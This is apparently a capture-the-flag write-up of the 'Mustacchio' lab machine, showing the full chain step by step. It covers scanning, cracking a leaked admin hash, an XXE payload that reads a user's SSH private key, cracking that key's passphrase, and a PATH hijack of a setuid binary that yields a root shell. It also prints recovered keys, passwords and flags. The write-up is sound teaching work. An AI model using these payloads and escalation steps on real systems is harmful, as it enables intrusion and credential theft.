
- - - 
created : 25-07-2025 

Tags : #easy 
- - - 
# Objective

Deploy and compromise the machine!

# Recon

## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md):

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ rustscan -a mustacchio.thm -- -A 

Open 10.10.218.105:22
Open 10.10.218.105:80
Open 10.10.218.105:8765

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
8765/tcp open  http    syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login

```
# Enumeration

## HTTP(80)

### Gobuster

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://mustacchio.thm         
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/custom               (Status: 301) [Size: 317] [--> http://mustacchio.thm/custom/]
/fonts                (Status: 301) [Size: 316] [--> http://mustacchio.thm/fonts/]
/images               (Status: 301) [Size: 317] [--> http://mustacchio.thm/images/]
/index.html           (Status: 200) [Size: 1752]
/robots.txt           (Status: 200) [Size: 28]
/server-status        (Status: 403) [Size: 279]
```

in /custom we find a backup let's download it .
### SQLite3

It is a sqlite database backup, let's use [SQLite3](SQLite3.md) to read it:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ sqlite3 users.bak                                              
SQLite version 3.46.1 2024-08-13 09:16:08

sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users(username text NOT NULL, password text NOT NULL);
INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');
COMMIT;

```

## Cracking

## Hash Identifier

We can use [HashIdentifier](../../3%20-%20Tags/Hacking%20Tools/HashIdentifier.md) to determine which type of hash it is:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ hashid '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'                                                                  
Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 
```

### John The Ripper

We can now crack it with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt          
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
'bulldog19'        (?)     
1g 0:00:00:00 DONE (2025-07-25 17:22) 11.11g/s 7601Kp/s 7601Kc/s 7601KC/s bulldog27..bullcrap1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.                                                    
```

## NGINX(8765)

We have a login page:

![Pasted image 20250725170130.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725170130.png)

We can login with the cracked password for the admin user:

![Pasted image 20250725172458.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725172458.png)
In the [Source Code](../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) :

![Pasted image 20250725172526.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725172526.png)

We also have :

![Pasted image 20250725173907.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725173907.png)

Let's go to the page to download and open it:

```
──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>            
```

We have 2 users : `joe` , `barry`. 
# Exploit

We modify the [XML](XML.md) code found to retrieve the mentioned ssh barry's private key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

![Pasted image 20250725180646.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725180646.png)
## Ssh2john 

We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) after `chmod 600 key`:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ cat barry_id 
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED 
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E 

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD 
-----END RSA PRIVATE KEY-----

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ chmod +600 barry_id

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ ssh2john barry_id > hash

```

## John The Ripper

Now we can crack the hash with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
'urieljames'       (barry_id)     
1g 0:00:00:00 DONE (2025-07-25 18:15) 1.960g/s 5824Kp/s 5824Kc/s 5824KC/s urielpoche1787..urielandrea
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## SSH First Access

Now we can use the key on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) and cat the user flag:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
└─$ ssh -i barry_id barry@mustacchio.thm 
Enter passphrase for key 'barry_id': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
```
#  Privilege Escalation

We have an interesting file in joe's home:

```bash
barry@mustacchio:/home$ cd joe
barry@mustacchio:/home/joe$ ls
live_log
```

We can try to run the `strings` command on the file and we can see that it is writting to file access.log:

```bash
barry@mustacchio:/home/joe$ strings live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$''
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

This lane `tail -f /var/log/nginx/accessl.log`shows us the binary is running without a full path.
As this file runs as the root users privileges, we can manipulate our path gain a root shell:
How to exploit it?  
1. Create a new directory in /tmp/ folder example :  
mkdir /tmp/shell  
2. Go into that folder :  
cd /tmp/shell  
3. Change the /usr/bin folder to /tmp/shell  
export PATH=/tmp/shell:$PATH  
4. Create a tail file, enter these two commands:  
echo ‘#!/bin/bash’ > tail  
echo ‘/bin/bash’ >> tail  
5. Change the permissions for the tail file  
chmod +x tail  
6. Go back to live_log and run the file  
./live_log

```bash
barry@mustacchio:/tmp$ echo "/bin/bash" > tail
barry@mustacchio:/tmp$ chmod 777 tail
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ cd /home/joe/
barry@mustacchio:/home/joe$ ./live_log
root@mustacchio:/home/joe# cd /root
root@mustacchio:/root# cat root.txt 
3223581420d906c4dd1a5f9b530393a5

```

Pwned !